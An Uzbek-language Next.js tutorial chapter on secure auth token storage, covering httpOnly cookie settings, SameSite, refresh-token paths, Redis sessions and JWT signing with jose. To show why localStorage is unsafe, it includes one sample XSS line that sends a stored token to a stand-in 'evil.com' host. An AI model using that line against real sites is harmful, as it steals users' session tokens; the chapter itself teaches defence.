# 26 — Token qayerda saqlanadi

[← Oldingi: Auth: kalit tushunchalar](25-auth-kalit-tushunchalar.md) · [Mundarija](README.md) · [Keyingi: Tashqi backend bilan login oqimi →](27-tashqi-backend-login.md)

## Tushuncha

Eng ko'p beriladigan savol va eng ko'p noto'g'ri javob olinadigan joy. To'liq jadval:

| Joy | XSS'da o'g'irlanadimi | CSRF xavfi | SSR o'qiy oladimi | Sahifa yangilansa |
| --- | --- | --- | --- | --- |
| `localStorage` | ✅ Ha | Yo'q | ❌ Yo'q | Saqlanadi |
| `sessionStorage` | ✅ Ha | Yo'q | ❌ Yo'q | Tab yopilsa yo'qoladi |
| Oddiy cookie | ✅ Ha | ✅ Ha | ✅ Ha | Saqlanadi |
| **httpOnly cookie** | ❌ Yo'q | Himoyalanadi | ✅ Ha | Saqlanadi |
| Klient xotirasi (`useRef`) | ❌ Yo'q (saqlanmaydi) | Yo'q | ❌ Yo'q | Yo'qoladi |

**Next uchun javob: httpOnly cookie.** Sabab — SSR: server komponent tokenni o'qiy olishi kerak, `localStorage` esa serverda mavjud emas.

## Kod: cookie sozlamalari

::: ts
```ts
'use server'

import { cookies } from 'next/headers'

export async function setSession(token: string, maxAgeSeconds: number) {
  const cookieStore = await cookies()

  cookieStore.set('session', token, {
    httpOnly: true,                                    // JS o'qiy olmaydi — XSS himoyasi
    secure: process.env.NODE_ENV === 'production',     // faqat HTTPS
    sameSite: 'lax',                                   // CSRF himoyasi
    path: '/',
    maxAge: maxAgeSeconds,
    // domain: '.example.com',                         // subdomainlar uchun
  })
}
```
:::

::: js
```js
'use server'

import { cookies } from 'next/headers'

export async function setSession(token, maxAgeSeconds) {
  const cookieStore = await cookies()

  cookieStore.set('session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: maxAgeSeconds,
  })
}
```
:::

Har bir sozlama nimaga qarshi:

| Sozlama | Nimadan himoyalaydi |
| --- | --- |
| `httpOnly: true` | XSS — zararli skript cookie'ni o'qiy olmaydi |
| `secure: true` | Tarmoqni tinglash (HTTP orqali yuborilmaydi) |
| `sameSite: 'lax'` | CSRF — boshqa saytdan POST yuborilganda cookie ketmaydi |
| `path: '/'` | Qamrov (odatda butun sayt) |
| `maxAge` | Muddat (brauzer o'zi o'chiradi) |

## Kod: `SameSite` variantlari

| Qiymat | Xatti-harakat | Qachon |
| --- | --- | --- |
| `strict` | Boshqa saytdan **hech qanday** so'rovda yuborilmaydi | Maksimal xavfsizlik; lekin tashqi havoladan kirganda foydalanuvchi "chiqib qolgan" ko'rinadi |
| `lax` | Faqat yuqori darajali GET navigatsiyada yuboriladi | **Standart tavsiya** |
| `none` | Har doim yuboriladi (`secure` majburiy) | Cross-site iframe, tashqi domen |

`lax` deyarli har doim to'g'ri tanlov: u CSRF'ning asosiy vektorlarini yopadi va UX'ni buzmaydi.

## Kod: ikki cookie strategiyasi

Access va refresh tokenlarni **alohida** saqlash:

::: ts
```ts
'use server'

import { cookies } from 'next/headers'

const ACCESS_COOKIE = 'access_token'
const REFRESH_COOKIE = 'refresh_token'

export async function setTokens(access: string, refresh: string) {
  const cookieStore = await cookies()

  // Access: qisqa muddat, butun saytda kerak
  cookieStore.set(ACCESS_COOKIE, access, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 60 * 15,                       // 15 daqiqa
  })

  // Refresh: uzoq muddat, FAQAT refresh endpointiga
  cookieStore.set(REFRESH_COOKIE, refresh, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api/auth',                     // qamrov toraytirildi
    maxAge: 60 * 60 * 24 * 30,             // 30 kun
  })
}

export async function clearTokens() {
  const cookieStore = await cookies()

  cookieStore.delete(ACCESS_COOKIE)
  cookieStore.delete({ name: REFRESH_COOKIE, path: '/api/auth' })
}
```
:::

::: js
```js
'use server'

import { cookies } from 'next/headers'

export async function setTokens(access, refresh) {
  const cookieStore = await cookies()

  cookieStore.set('access_token', access, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 60 * 15,
  })

  cookieStore.set('refresh_token', refresh, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api/auth',
    maxAge: 60 * 60 * 24 * 30,
  })
}
```
:::

`path: '/api/auth'` — muhim detal: refresh token faqat o'sha endpointga yuboriladi, ya'ni har oddiy sahifa so'rovida tarmoq orqali uzatilmaydi.

## Kod: cookie hajmi muammosi

Cookie chegarasi — **4 KB**. JWT payload katta bo'lsa (ko'p ruxsatlar, profil ma'lumoti), u sig'maydi.

Uch yechim:

::: ts
```ts
// 1. Payload'ni kichiklashtirish (eng oddiy)
// { sub, exp, role } — 200 bayt, yetarli

// 2. Cookie'da faqat sessiya ID, qolgani serverda
export async function createSession(userId: number) {
  const sessionId = crypto.randomUUID()

  await redis.set(`session:${sessionId}`, JSON.stringify({ userId }), { EX: 60 * 60 * 24 * 7 })

  const cookieStore = await cookies()

  cookieStore.set('session', sessionId, { httpOnly: true, secure: true, sameSite: 'lax', path: '/' })
}

// 3. Cookie'ni bo'lish (tavsiya etilmaydi — murakkab)
```
:::

::: js
```js
export async function createSession(userId) {
  const sessionId = crypto.randomUUID()

  await redis.set(`session:${sessionId}`, JSON.stringify({ userId }), { EX: 60 * 60 * 24 * 7 })

  const cookieStore = await cookies()

  cookieStore.set('session', sessionId, { httpOnly: true, secure: true, sameSite: 'lax', path: '/' })
}
```
:::

Ikkinchi variant (sessiya ID + Redis) — katta ilovalar uchun eng moslashuvchan: bekor qilish oson, hajm muammosi yo'q, ruxsatlar darhol yangilanadi.

## Kod: shifrlangan sessiya cookie (JWE)

Agar backend'ingiz yo'q bo'lsa va Next'ning o'zi sessiyani boshqarsa, cookie ichidagi ma'lumotni shifrlash mumkin:

::: ts
```ts
// lib/session.ts
import 'server-only'
import { SignJWT, jwtVerify } from 'jose'
import { cookies } from 'next/headers'

const secret = new TextEncoder().encode(process.env.SESSION_SECRET!)

export type SessionPayload = { userId: number; role: string; expiresAt: number }

export async function encrypt(payload: SessionPayload) {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(secret)
}

export async function decrypt(token: string | undefined): Promise<SessionPayload | null> {
  if (!token) return null

  try {
    const { payload } = await jwtVerify(token, secret, { algorithms: ['HS256'] })

    return payload as SessionPayload
  } catch {
    return null                                 // muddati tugagan yoki imzo noto'g'ri
  }
}

export async function getSession() {
  const cookieStore = await cookies()

  return decrypt(cookieStore.get('session')?.value)
}
```
:::

::: js
```js
// lib/session.js
import 'server-only'
import { SignJWT, jwtVerify } from 'jose'
import { cookies } from 'next/headers'

const secret = new TextEncoder().encode(process.env.SESSION_SECRET)

export async function encrypt(payload) {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(secret)
}

export async function decrypt(token) {
  if (!token) return null

  try {
    const { payload } = await jwtVerify(token, secret, { algorithms: ['HS256'] })

    return payload
  } catch {
    return null
  }
}
```
:::

`jose` — Web Crypto API'ga tayanadi, shuning uchun **Edge runtime'da ham ishlaydi** (middleware uchun muhim, 14-bob). `jsonwebtoken` esa Node'ga bog'liq va Edge'da ishlamaydi.

`algorithms: ['HS256']` ni aniq ko'rsatish majburiy — aks holda "alg: none" hujumi mumkin.

## Kod: klient tokenni ko'rmasligini tekshirish

::: ts
```tsx
// ✗ XATO: token klient komponentga uzatilyapti
export default async function Layout({ children }: { children: React.ReactNode }) {
  const cookieStore = await cookies()
  const token = cookieStore.get('session')?.value

  return <AuthProvider token={token}>{children}</AuthProvider>    // ✗ RSC payload'da ko'rinadi!
}

// ✓ To'g'ri: faqat kerakli ma'lumot
export default async function Layout({ children }: { children: React.ReactNode }) {
  const user = await getCurrentUser()

  return (
    <AuthProvider user={user ? { id: user.id, name: user.name, role: user.role } : null}>
      {children}
    </AuthProvider>
  )
}
```
:::

::: js
```jsx
// ✓ To'g'ri
export default async function Layout({ children }) {
  const user = await getCurrentUser()

  return (
    <AuthProvider user={user ? { id: user.id, name: user.name, role: user.role } : null}>
      {children}
    </AuthProvider>
  )
}
```
:::

**Muhim:** server komponentdan klientga uzatilgan hamma narsa **RSC payload'da (ya'ni HTML manbasida)** ko'rinadi. Tokenni uzatish — uni `localStorage` ga qo'yish bilan bir xil darajada xavfli.

Tekshirish: brauzerda "View source" qilib, token yoki maxfiy maydonlarni qidiring.

## Kod: mobil ilova bilan bo'lishish

Agar API'ni mobil ilova ham ishlatsa, ikki yondashuv:

| Yondashuv | Web | Mobil |
| --- | --- | --- |
| **Ikki xil sessiya** | httpOnly cookie | Bearer token (Keychain/Keystore) |
| **Bitta token** | Cookie ichida token | Bearer token |

Birinchi variant afzal: backend ikkalasini ham qo'llab-quvvatlaydi, web tomonda esa cookie xavfsizligi saqlanadi.

Mobil'da `localStorage` ekvivalenti yo'q — token **xavfsiz saqlash** (iOS Keychain, Android Keystore) da bo'ladi, bu brauzerdan xavfsizroq.

## Muhandislik nuqtai nazari: nega `localStorage` emas

Ko'p SPA qo'llanmalarida `localStorage` tavsiya qilinadi. Next kontekstida u **ikki sababga ko'ra** yaramaydi:

**1. Texnik:** server komponent uni o'qiy olmaydi. Ya'ni:

- SSR paytida foydalanuvchi kim ekanini bilmaysiz;
- Har sahifa klient komponent bo'lishi kerak bo'ladi;
- RSC'ning asosiy afzalliklari yo'qoladi.

**2. Xavfsizlik:** bitta XSS teshigi butun hisobni ochib beradi:

```js
// Zararli skript
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

httpOnly cookie bilan bu ishlamaydi — JS uni **o'qiy olmaydi**.

Qarshi dalil: "httpOnly cookie ham CSRF'ga ochiq". To'g'ri, lekin CSRF `SameSite=Lax` bilan yopiladi va u XSS'dan ko'ra ancha kam xavfli (hujumchi javobni o'qiy olmaydi).

## Muhandislik nuqtai nazari: cookie nomlash

```
session          — umumiy sessiya
access_token     — access token
refresh_token    — refresh token
__Host-session   — qat'iy prefiks (path=/, secure, domainsiz)
```

`__Host-` prefiksi qo'shimcha himoya beradi: brauzer bunday cookie'ni faqat `Secure`, `Path=/` va **domainsiz** bo'lsa qabul qiladi — ya'ni subdomain uni o'rnata olmaydi.

```ts
cookieStore.set('__Host-session', token, {
  httpOnly: true,
  secure: true,             // majburiy
  sameSite: 'lax',
  path: '/',                // majburiy
  // domain: YO'Q           // bo'lmasligi shart
})
```

## Muhandislik nuqtai nazari: muddatlar

| Token | Tavsiya |
| --- | --- |
| Access | 5–15 daqiqa |
| Refresh | 7–30 kun |
| "Eslab qol" sessiyasi | 30–90 kun |
| Admin sessiyasi | 1–8 soat |
| To'lov/nozik amal | Qayta tasdiqlash (step-up auth) |

Qisqa access token + refresh — kompromis: o'g'irlangan token tez eskiradi, foydalanuvchi esa qayta kirmaydi.

Nozik amallar (parol o'zgartirish, to'lov) uchun **qayta tasdiqlash** so'rang — sessiya yangi bo'lsa ham.

## Tipik xatolar

| Xato | Nega yomon | To'g'ri yechim |
| --- | --- | --- |
| `localStorage` da token | XSS'da o'g'irlanadi, SSR o'qiy olmaydi | httpOnly cookie |
| Tokenni klient komponentga props sifatida uzatish | RSC payload'da ko'rinadi | Faqat kerakli maydonlar |
| `httpOnly` ni unutish | JS o'qiy oladi | Har doim `true` |
| `secure` ni production'da qo'ymaslik | HTTP orqali yuboriladi | `NODE_ENV` tekshiruvi |
| `sameSite: 'none'` sababsiz | CSRF ochiq | `lax` |
| Refresh tokenni `path: '/'` bilan | Har so'rovda uzatiladi | `path: '/api/auth'` |
| 4 KB dan katta JWT | Cookie sig'maydi | Payload'ni kichiklashtiring yoki sessiya ID |
| `jsonwebtoken` ni middleware'da | Edge'da ishlamaydi | `jose` |
| Access token muddatini kunlar qilish | O'g'irlansa uzoq ishlatiladi | 5–15 daqiqa |

## Amaliyot

1. Server Action yozing: cookie o'rnatsin (`httpOnly`, `secure`, `sameSite`) va DevTools → Application → Cookies da tekshiring.
2. Brauzer konsolida `document.cookie` ni chop eting — httpOnly cookie ko'rinmasligini tasdiqlang.
3. Tokenni klient komponentga props sifatida uzating va "View source" da uni toping — keyin tuzating.
4. `jose` bilan sessiya shifrlash/ochish funksiyalarini yozing va noto'g'ri imzo bilan sinab ko'ring.
5. `__Host-` prefiksli cookie o'rnating va `domain` qo'shib ko'ring — brauzer rad etishini kuzating.
6. Access va refresh tokenlarni turli `path` bilan o'rnating va Network panelida qaysi so'rovda qaysi biri ketayotganini ko'ring.

## Rasmiy hujjat

- `cookies()`: <https://nextjs.org/docs/app/api-reference/functions/cookies>
- MDN — Set-Cookie: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie>
- OWASP — Cookie xavfsizligi: <https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies>
- `jose`: <https://github.com/panva/jose>
